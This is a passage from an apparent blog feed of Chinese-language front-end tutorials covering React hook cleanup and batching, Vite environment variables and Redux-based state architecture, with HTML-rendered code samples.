&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Counter</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> [reset, count, increment] = <span class="title function_">useCounter</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onClick</span>=<span class="string">&#123;increment&#125;</span>&gt;</span>add<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onClick</span>=<span class="string">&#123;reset&#125;</span>&gt;</span>reset<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;count)&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="useEffect-的常見問題與解決方案"><a href="#useEffect-的常見問題與解決方案" class="headerlink" title="useEffect 的常見問題與解決方案"></a>useEffect 的常見問題與解決方案</h3><ol><li>依賴缺失警告 (useEffect has a missing dependency)：確保所有在 useEffect 中使用的變數都包含在依賴陣列中。</li><li>元件卸載後更新 (update on a unmounted component)：在清理函式中處理 API 請求或計時器的中止。</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">fetchData</span>();</span><br><span class="line">  <span class="title function_">updateCloumn</span>();</span><br><span class="line">&#125;, []);</span><br></pre></td></tr></table></figure><ol><li>useEffect 中去打 API，但是資料回來時使用者已經切換到其他畫面</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> controller = <span class="keyword">new</span> <span class="title class_">AbortController</span>();</span><br><span class="line">  (<span class="title function_">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(</span><br><span class="line">        <span class="string">`https://jsonplaceholder.typicode.com/posts`</span>,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">signal</span>: controller.<span class="property">signal</span>,</span><br><span class="line">        &#125;</span><br><span class="line">      );</span><br><span class="line">      <span class="title function_">setList</span>(<span class="keyword">await</span> response.<span class="title function_">json</span>());</span><br><span class="line">      controller = <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      <span class="comment">// Handle the error</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)();</span><br><span class="line">  <span class="comment">// aborts the request when the component umounts</span></span><br><span class="line">  <span class="keyword">return</span> <span class="function">() =&gt;</span> controller?.<span class="title function_">abort</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ol start="2"><li>timer function 也是同樣的概念</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> timerId = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    timerId = <span class="literal">null</span>;</span><br><span class="line">    <span class="title function_">setList</span>([]);</span><br><span class="line">  &#125;, <span class="number">1000</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="function">() =&gt;</span> <span class="built_in">clearTimeout</span>(timerId);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ol start="3"><li>websocket 由於跟 API 的概念不太一樣，做法就是直接關掉</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> webSocket = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(url);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="function">() =&gt;</span> webSocket.<span class="title function_">close</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="hook-效能優化"><a href="#hook-效能優化" class="headerlink" title="hook 效能優化"></a>hook 效能優化</h2><p>在撰寫 hook 且狀態較複雜時，會有底下兩種策略</p><ul><li>useState(Primitive): 宣告多個 useState 搭配多個值</li><li>useState(Object): 宣告一個 useState 搭配一個物件中含有多個值</li></ul><p>在 React 18 版之前，宣告多個 State 的寫法如下:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> [isLoading, setLoading] = <span class="title function_">useState</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">const</span> [list, setlist] = <span class="title function_">useState</span>([]);</span><br><span class="line"><span class="title function_">useEffect</span>(<span class="title function_">async</span> () =&gt; &#123;</span><br><span class="line">  <span class="title function_">fetch</span>(<span class="string">&quot;/list&quot;</span>)</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function">(<span class="params">res</span>) =&gt;</span> res.<span class="title function_">json</span>())</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">setlist</span>(data);</span><br><span class="line">      <span class="title function_">setLoading</span>(<span class="literal">false</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;, []);</span><br></pre></td></tr></table></figure><p>這樣的寫法會因為兩個 setState 發生在非同步完成之後，所以 React 並不會 batch 他們而造成兩次的畫面渲染。</p><p>所以在 React 還沒協助處理之前，最簡單的方式就是透過物件一次設定，或是使用 <code>unstable_batchedUpdates</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">setStateOnce</span>(&#123;</span><br><span class="line">  <span class="attr">list</span>: data,</span><br><span class="line">  <span class="attr">isLoading</span>: <span class="literal">false</span>,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>有篇 Github 上的討論蠻精彩的，有興趣可以參考如下:<br><a href="https://github.com/reactwg/react-18/discussions/21">https://github.com/reactwg/react-18/discussions/21</a></p><p>內文中也有提供範例，大家可以進去試用看看兩者差異。</p><ul><li>✅ Demo: <a href="https://codesandbox.io/s/spring-water-929i6?file=/src/index.js">React 17 batches inside event handlers.</a> (Notice one render per click in the console.)</li><li>🟡 Demo: <a href="https://codesandbox.io/s/trusting-khayyam-cn5ct?file=/src/index.js">React 17 does NOT batch outside event handlers.</a> (Notice two renders per click in the console.)</li></ul><p>在剛開始寫 hook 的時候，可能會寫像是以下的程式碼。下面 <code>console.log</code> 會一直印，代表每次都重新 render，但 Increment 這個其實沒有改變，該怎麼避免?</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useState &#125; <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">CountDisplay</span> = (<span class="params">&#123; count &#125;</span>) =&gt; <span class="language-xml"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>Count: &#123;count&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">CountButton</span> = (<span class="params">&#123; updateCount &#125;</span>) =&gt; &#123;</span><br><span class="line">  <span class="comment">// 下面這行會一直印，代表每次都重新 render，但 Increment 這個其實沒有改變，該怎麼避免</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;=&gt; CountButton render&quot;</span>, <span class="title class_">Date</span>.<span class="title function_">now</span>());</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> updateCount()&#125;&gt;Increment<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">App</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = <span class="title function_">useState</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">updateCount</span> = (<span class="params"></span>) =&gt; <span class="title function_">setCount</span>(<span class="function">(<span class="params">c</span>) =&gt;</span> c + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">CountButton</span> <span class="attr">updateCount</span>=<span class="string">&#123;updateCount&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">CountDisplay</span> <span class="attr">count</span>=<span class="string">&#123;count&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br></pre></td></tr></table></figure><p>除了基本的 hook 以外，常用的還有以下:</p><ul><li>useState: 加入元件狀態，但這裡的 setState 不會幫我們自動合併物件型態的狀態，需要用 callback 方式寫並且自行合併</li><li>useReducer: 可以用來處理物件型態的狀態</li><li>useEffect: 處理 side effect，取代 componentDidMount, componentDidUpdate, componentWillUnmount</li><li>useCallback: 當 function 需要在 useEffect 中被使用但又不想加入觸發條件</li><li>useMemo: 把較高成本計算記起來</li><li>useRef: 取得參考用的 object</li></ul><p>剛剛解決方案的小提示</p><ol><li>useMemo: 可以記住函式運算值</li><li>useCallBack: 可以記住函式</li></ol><h3 id="React-18-useState-Automatic-Batching"><a href="#React-18-useState-Automatic-Batching" class="headerlink" title="React 18 useState Automatic Batching"></a>React 18 useState Automatic Batching</h3><p>前面提到的問題將在 React 18 之後獲得解決，即使是非同步 callback 中的 setState 也會自動 batch 而不會造成兩次的渲染，還是想分開反而要自己使用 <code>ReactDOM.flushSync</code> 來分開。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = <span class="title function_">useState</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">const</span> [flag, setFlag] = <span class="title function_">useState</span>(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">handleClick</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">setCount</span>(<span class="function">(<span class="params">c</span>) =&gt;</span> c + <span class="number">1</span>); <span class="comment">// Does not re-render yet</span></span><br><span class="line">    <span class="title function_">setFlag</span>(<span class="function">(<span class="params">f</span>) =&gt;</span> !f); <span class="comment">// Does not re-render yet</span></span><br><span class="line">    <span class="comment">// React will only re-render once at the end (that&#x27;s batching!)</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;handleClick&#125;</span>&gt;</span>Next<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">&#123;&#123;</span> <span class="attr">color:</span> <span class="attr">flag</span> ? &quot;<span class="attr">blue</span>&quot; <span class="attr">:</span> &quot;<span class="attr">black</span>&quot; &#125;&#125;&gt;</span>&#123;count&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = <span class="title function_">useState</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">const</span> [flag, setFlag] = <span class="title function_">useState</span>(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">handleClick</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">fetchSomething</span>().<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// React 17 and earlier does NOT batch these because</span></span><br><span class="line">      <span class="comment">// they run *after* the event in a callback, not *during* it</span></span><br><span class="line">      <span class="title function_">setCount</span>(<span class="function">(<span class="params">c</span>) =&gt;</span> c + <span class="number">1</span>); <span class="comment">// Causes a re-render</span></span><br><span class="line">      <span class="title function_">setFlag</span>(<span class="function">(<span class="params">f</span>) =&gt;</span> !f); <span class="comment">// Causes a re-render</span></span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;handleClick&#125;</span>&gt;</span>Next<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">&#123;&#123;</span> <span class="attr">color:</span> <span class="attr">flag</span> ? &quot;<span class="attr">blue</span>&quot; <span class="attr">:</span> &quot;<span class="attr">black</span>&quot; &#125;&#125;&gt;</span>&#123;count&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="hooks-優點與缺點"><a href="#hooks-優點與缺點" class="headerlink" title="hooks 優點與缺點"></a>hooks 優點與缺點</h2><h3 id="優點"><a href="#優點" class="headerlink" title="優點"></a>優點</h3><ul><li>更接近原生 JavaScript，對於初學者友好，且不需要理解 ES6。</li><li>減少複雜的元件週期管理，只需控制 <code>useEffect</code>。</li><li>提供簡化的解決方案，如 Redux 的 <code>useSelector</code>。</li><li>更容易進行程式碼壓縮和最佳化。</li></ul><h3 id="缺點"><a href="#缺點" class="headerlink" title="缺點"></a>缺點</h3><ul><li><code>useEffect</code> 可能會將多個副作用合併，需謹慎管理依賴。</li><li>避免在函式中使用 <code>new</code> 或未處理的事件監聽器，避免每次渲染時都重做一次。</li><li>尚未涵蓋 <code>getSnapshotBeforeUpdate</code> 和 <code>componentDidCatch</code> 這兩個生命周期方法。</li></ul><h3 id="壓縮-minified"><a href="#壓縮-minified" class="headerlink" title="壓縮 (minified)"></a>壓縮 (minified)</h3><p>React 團隊指出，Hook 是純函式，這使得程式碼壓縮（minified）變得更簡單，相對於類別元件來說更易於進行壓縮和優化。</p><p>注意: 詳細閱讀 <a href="https://reactjs.org/docs/hooks-intro.html">React Hooks 文件</a> 以了解更多信息。</p>]]></content>
      
      
      <categories>
          
          <category> React.js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> React.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vite 系統環境變數</title>
      <link href="/2024/05/30/tool-vite-system-env/"/>
      <url>/2024/05/30/tool-vite-system-env/</url>
      
        <content type="html"><![CDATA[<p>環境變數對於一個系統來說是非常重要的，以把妹來說同樣的男生遇到不同的妹子時，腦中需要即時套用不同的參數來做出對應的表現來不被抓包自己是海王。</p><p>系統在設計和規劃的時候，當然也需要經過環境變數的設計來讓同樣一套系統能夠應對測試、UAT、Production 環境的情境。</p><h2 id="Vite-系統環境變數設定"><a href="#Vite-系統環境變數設定" class="headerlink" title="Vite 系統環境變數設定"></a>Vite 系統環境變數設定</h2><p>Vite 是下一代的前端模組打包工具，背後是直接使用 ESM 所以可以達到快速即時的開發體驗，但也由於是 ESM 的關係，處理環境變數上的設定有些許不同。</p><p>通常在跑 CICD 的過程中，我們會在 pipeline 上設定環境變數，但這樣的設定就和 vite 本身直接支援的方式略有落差。</p><p>做法有兩種，用 vite 內建的或是直接讀取 pipeline 上的。</p><p>Vite 內建，參考下面的連結，關鍵就是依照環境多寫一份 <code>.env</code>，像是 <code>.env.production</code>、<code>.env.staging</code> 跑的時候搭配 <code>--mode staging</code>，環境變數中的 Key 需要用 <code>VITE</code> 開頭 <code>VITE_SOME_KEY</code> 最後就可以用特殊的全域變數使用 <code>import.meta.env.VITE_SOME_KEY</code> 來使用。</p><p><a href="https://vitejs.dev/guide/env-and-mode.html#node-env-and-modes">https://vitejs.dev/guide/env-and-mode.html#node-env-and-modes</a></p><p>透過 vite 內建函式讀取系統的環境變數，並透過 ESM define 成全域變數，這個方式就不用額外再定義環境檔</p><p><a href="https://vitejs.dev/config/#using-environment-variables-in-config">https://vitejs.dev/config/#using-environment-variables-in-config</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; defineConfig, loadEnv &#125; <span class="keyword">from</span> <span class="string">&quot;vite&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineConfig</span>(<span class="function">(<span class="params">&#123; command, mode &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// Load env file based on `mode` in the current working directory.</span></span><br><span class="line">  <span class="comment">// Set the third parameter to &#x27;&#x27; to load all env regardless of the `VITE_` prefix.</span></span><br><span class="line">  <span class="keyword">const</span> env = <span class="title function_">loadEnv</span>(mode, process.<span class="title function_">cwd</span>(), <span class="string">&quot;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="comment">// vite config</span></span><br><span class="line">    <span class="attr">define</span>: &#123;</span><br><span class="line">      <span class="attr">__APP_ENV__</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(env.<span class="property">APP_ENV</span>),</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>但因為是透過 <a href="https://esbuild.github.io/api/#define">ESBuild 的 define</a> 成全域變數關係，所以如果是使用 TypeScript 需要額外進行底下設定，才不會出現錯誤警告。</p><p><a href="https://vitejs.dev/config/shared-options.html#define">https://vitejs.dev/config/shared-options.html#define</a></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vite-env.d.ts</span></span><br><span class="line"><span class="keyword">declare</span> <span class="keyword">const</span> <span class="attr">__APP_VERSION__</span>: <span class="built_in">string</span>;</span><br></pre></td></tr></table></figure><p>最後都定義成全域變數後就直接使用了。</p>]]></content>
      
      
      <categories>
          
          <category> 前後端如何和平相處 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> DevOps </tag>
            
            <tag> CI/CD </tag>
            
            <tag> 前後端如何和平相處 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Reactjs 問世十年後的開發體驗</title>
      <link href="/2024/04/06/react-10-years-developer-experience/"/>
      <url>/2024/04/06/react-10-years-developer-experience/</url>
      
        <content type="html"><![CDATA[<p>Reactjs 從 2013 年問世後至今滿 10 年，提供前端開發領域元件設計的典範基礎，逐步帶動並完善了開發的生態系統。</p><p>最初的 React 就是一個單純的函式，提供 props 並進行內部的狀態運算後回傳一個計算後的 DOM 元素呈現在網頁上。</p><blockquote><p>DOM &#x3D; React(props, state)</p></blockquote><p>回顧過去的十年，Reactjs 的發展從 Clean Architecture 角度來看主要圍繞以下三個層面：</p><ul><li>資料層：單向資料流</li><li>業務邏輯層：Hooks</li><li>展示層：JSX、CSS-in-JS</li></ul><blockquote><p><img src="https://blog.cleancoder.com/uncle-bob/images/2012-08-13-the-clean-architecture/CleanArchitecture.jpg"><br>圖片來源: <a href="https://blog.cleancoder.com/uncle-bob/2012/08/13/the-clean-architecture.html">https://blog.cleancoder.com/uncle-bob/2012/08/13/the-clean-architecture.html</a></p></blockquote><p>在 2024 年 Reactjs 的開發體驗將會是什麼樣子呢？</p><p>React 近十年的發展下來，在 2022 React 18 版本釋出後停滯了接近兩年，下一個主要版本 19 會是著重在新的渲染引擎，從官方的 Github 可可以看出接下來的 <a href="https://github.com/facebook/react/pull/28843">React 18.3</a> 主要是為了接下來的 <a href="https://react.dev/blog/2024/02/15/react-labs-what-we-have-been-working-on-february-2024">React 19 版</a>做準備，部落格可以看出 React 19 將減少開發者撰寫多餘的 hook，最終的目的是簡化開發流程，降低開發人員的學習成本，提供更簡潔的開發體驗與更高的開發效率。</p><p>相較於同樣有著包袱的隔壁棚 Angular 每次升級幾乎都是 Breaking Change，React 從最初的簡單函式庫在經歷了多次版本迭代，繼續背著承重的歷史包袱帶著大家繼續前行。</p><p>相對於 React、Angular，較沒有人員和程式碼包袱的 Vue 和 Svelte 也都在 React 和 Angular 的肩膀上提供了不錯的解決方案，至於最新的 React Server Components 要讓 React 一袋米扛幾樓? Next.js 和 RedwoodJS 正在嘗試著給出好的答案。</p><h2 id="資料層-Flux-架構、Redux"><a href="#資料層-Flux-架構、Redux" class="headerlink" title="資料層: Flux 架構、Redux"></a>資料層: Flux 架構、Redux</h2><blockquote><p>Reactjs 提出單向資料流（Unidirectional Data Flow）的概念，強調資料的不可變性（Immutability）</p></blockquote><p>Flux 架構提供資料管理方案，小編早期接觸過 <a href="https://alt.js.org/">Alt</a> 和 <a href="https://redux.js.org/">Redux</a> 兩種，Flux 用單向資料流取代傳統的 MVC，這意資料從單一入口 (動作) 進入，然後透過狀態管理器 (Store) 向外流動，最後到達畫面 (view)，畫面又可以透過呼叫其他動作來回應使用者輸入，重新開始資料流的流程。</p><p>早期的 Redux 有個問題就是會產生很多的 Code Boilerplate，開發過程中會很常需要複製貼上許多類似架構的程式碼，官方後來還推出 <a href="https://redux.js.org/recipes/reducing-boilerplate">Redux Toolkits 來協助寫法簡化</a>，本來要維護三個地方，現在變成只要維護一份配置檔就好了。</p><h3 id="Store-Rudux"><a href="#Store-Rudux" class="headerlink" title="Store: Rudux"></a>Store: Rudux</h3><p>為什麼需要 Redux? 使用與否的差異在哪?</p><p>直接開始一個情境，我們想像一個頁面中有三個元件:</p><ol><li>元件一: 登入按鈕區塊，登入後顯示 hello, XXX (XXX 為學生名稱)</li><li>元件二: 顯示登入後撈回的各科成績資料</li><li>元件三: 更改學生姓名區塊</li></ol><p>那麼有或沒有 Redux 的情況下，要怎麼實作這樣的頁面呢？關鍵需要解決的問題就是元件之間溝通的問題:</p><ul><li>沒有 Redux 時: 使用 Container 元件來管理狀態，把以上三個子元件都放在容器裡，並在容器中寫幾個 callback function 當作 props 傳進子元件中，讓子元件可以在改變狀態時,把改變的狀態及時回傳到容器裡，這就是官方文件中寫的 <a href="https://facebook.github.io/react/docs/lifting-state-up.html">Lift State Up</a></li></ul><blockquote><p><img src="https://react.dev/_next/image?url=/images/docs/diagrams/passing_data_lifting_state.dark.png&w=640&q=75"><br>Lift State up: <a href="https://react.dev/learn/passing-data-deeply-with-context">https://react.dev/learn/passing-data-deeply-with-context</a></p></blockquote><ul><li>有 Redux 後: 最大的改變就是，Lift State Up to Store，把狀態統一管理避免 Prop drilling 維持 Single Source of Truth，所有的來源都是來自於一個可被預測的地方，開發工具因此可以做到時空旅行，讓狀態停在任意想要的時間點</li></ul><blockquote><p><img src="https://react.dev/_next/image?url=/images/docs/diagrams/passing_data_prop_drilling.dark.png&w=640&q=75"><br>Prop drilling: <a href="https://react.dev/learn/passing-data-deeply-with-context">https://react.dev/learn/passing-data-deeply-with-context</a></p></blockquote><p>使用 Redux ToolKits 後按照功能搭配分類，以剛剛 Clean Architecture 角度來說就是針對 Entities 分類，小編覺得這種配置會比較適合大型專案，舉例來說依照不同的腳色功能就會分成</p><ul><li>typeOne</li><li>typeTwo</li><li>typeThree</li></ul><p>用常見的拍賣網站來說就像是買家、普通賣家、商城賣家，而每個功能所需要的 action、components、containers、reducers 都會放在一起，所以在開發時，每個工程師都可以在獨立的資料夾中完成該次的任務。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">src</span><br><span class="line">└── features</span><br><span class="line">    ├── typeOne</span><br><span class="line">    │   ├── TypeOne.js</span><br><span class="line">    │   ├── TypeOne.styles.scss</span><br><span class="line">    │   └── typeOneSlice.js</span><br><span class="line">    ├── typeTwo</span><br><span class="line">    │   ├── TypeTwo.js</span><br><span class="line">    │   ├── TypeTwo.styles.scss</span><br><span class="line">    │   └── typeTwoSlice.js</span><br><span class="line">    └── typeThree</span><br><span class="line">        ├── TypeThree.js</span><br><span class="line">        ├── TypeThree.styles.scss</span><br><span class="line">        └── typeThreeSlice.js</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createSlice &#125; <span class="keyword">from</span> <span 